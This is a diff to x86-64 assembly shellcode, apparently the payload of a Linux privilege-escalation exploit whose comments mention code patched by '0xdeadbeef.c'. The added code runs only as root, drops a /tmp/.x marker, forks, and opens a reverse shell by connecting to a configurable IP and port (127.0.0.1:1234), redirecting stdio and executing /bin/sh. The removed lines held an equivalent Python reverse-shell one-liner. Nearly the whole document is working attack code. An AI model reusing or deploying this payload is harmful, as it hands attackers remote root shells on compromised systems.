@@ -2,69 +2,130 @@
 		[SECTION .text]
 		global _start
 
+SYS_OPEN	equ 0x2
+SYS_SOCKET	equ 0x29
+SYS_CONNECT	equ 0x2a
+SYS_DUP2	equ 0x21
+SYS_FORK	equ 0x39
+SYS_EXECVE	equ 0x3b
+SYS_EXIT	equ 0x3c
+SYS_GETUID	equ 0x66
+
+AF_INET		equ 0x2
+SOCK_STREAM	equ 0x1
+
+IP		equ 0x0100007f
+PORT		equ 0xd204
+
 _start:
-		;; exit if getuid() != 0
-		mov		rax, 0x66
+		;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+		;;
+		;; return if getuid() != 0
+		;;
+		;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
+		mov	rax, SYS_GETUID
 		syscall
 		test	rax, rax
-		jne		exit
+		jne	return
 
-		;; access("/tmp/.x", R_OK)
+		;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+		;;
+		;; return if open("/tmp/.x", O_CREAT|O_EXCL, x) == -1
+		;;
+		;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
 		push    rdi
 		push    rsi
 		mov     rsi, 0x00782e2f706d742f
 		push    rsi
 		mov     rdi, rsp
-		mov     rsi, 4
-		mov     rax, 0x15
+		mov     rsi, 192
+		mov     rax, SYS_OPEN
 		syscall
 		test    rax, rax
 		pop     rsi
 		pop     rsi
 		pop     rdi
-		je      exit
+		js      return
 
 		;; fork
-		mov     rax, 0x39
+		mov     rax, SYS_FORK
 		syscall
 		test    rax, rax
-		jne     exit
+		jne	return
 
-		push    rax
-		mov     rdx, rsp		; arg3 [ NULL ]
+		;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+		;;
+		;; reverse connect (https://www.exploit-db.com/exploits/35587/)
+		;;
+		;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
-		mov     rbx, 0x6e6f687479702fff
-		shr     rbx, 0x8
-		push    rbx
-		mov     rbx, 0x6e69622f7273752f
-		push    rbx
-		mov     rdi, rsp		; arg1 "/usr/bin/python"
-
-		push    rax				; NULL
-		call    python
-		push    rcx				; "-c..."
-		push    rdi				; "/usr/bin/python"
-		mov     rsi, rsp		; arg2 [ "/usr/bin/python", "-c...", NULL ]
-
-		;; exec
-		mov     al, 0x3b
+		;; sockfd = socket(AF_INET, SOCK_STREAM, 0)
+		xor	rsi, rsi	; 0 out rsi
+		mul	esi		; 0 out rax, rdx ; rdx = IPPROTO_IP (int: 0)
+		inc	rsi             ; rsi = SOCK_STREAM
+		push	AF_INET
+		pop	rdi
+		add	al, SYS_SOCKET
 		syscall
 
-		;; exit
-		mov     al, 0x3c
+		; copy socket descriptor to rdi for future use
+		push	rax
+		pop	rdi
+
+		; server.sin_family = AF_INET
+		; server.sin_port = htons(PORT)
+		; server.sin_addr.s_addr = IP
+		; bzero(&server.sin_zero, 8)
+		push	rdx
+		push	rdx
+		mov	dword [rsp + 0x4], IP
+		mov	word [rsp + 0x2], PORT
+		mov	byte [rsp], AF_INET
+
+		;; connect(sockfd, (struct sockaddr *)&server, sockaddr_len)
+		push	rsp
+		pop	rsi
+		push	0x10
+		pop	rdx
+		push	SYS_CONNECT
+		pop	rax
+		syscall
+		test    rax, rax
+		js      exit
+
+		;; dup2(sockfd, STDIN); dup2(sockfd, STDOUT); dup2(sockfd, STERR)
+		xor	rax, rax
+		push	0x3		; loop down file descriptors for I/O
+		pop	rsi
+dup_loop:
+		dec	esi
+		mov	al, SYS_DUP2
+		syscall
+		jne	dup_loop
+
+		;; execve('//bin/sh', NULL, NULL)
+		push	rsi		; *argv[] = 0
+		pop	rdx		; *envp[] = 0
+		push	rsi		; '\0'
+		mov	rdi, '//bin/sh'	; str
+		push	rdi
+		push	rsp
+		pop	rdi		; rdi = &str (char*)
+		xor	rax, rax
+		mov	al, SYS_EXECVE
 		syscall
 
 exit:
+		xor	rax, rax
+		mov	al, SYS_EXIT
+		syscall
+
+return:
 		;; get callee address (pushed on the stack by the call instruction)
 		pop     rax
-		;; execute missed instructions (patched by exploit)
+		;; execute missed instructions (patched by 0xdeadbeef.c)
 		db	0xde, 0xad, 0xbe, 0xef, 0xde, 0xad, 0xbe, 0xef, 0xde, 0xad, 0xbe, 0xef
 		;; return to callee
 		jmp     rax
-
-python:
-		;; 		mov     rcx, rip+8
-		lea     rcx, [rel $ +8]
-		ret
-		db      '-cimport os,socket;open("/tmp/.x","w");s=socket.socket(2,1);s.connect(("127.000.000.001",1234));[os.dup2(s.fileno(),i) for i in range(3)];os.execvp("/bin/bash",["bash","-i"])'
-		db      0
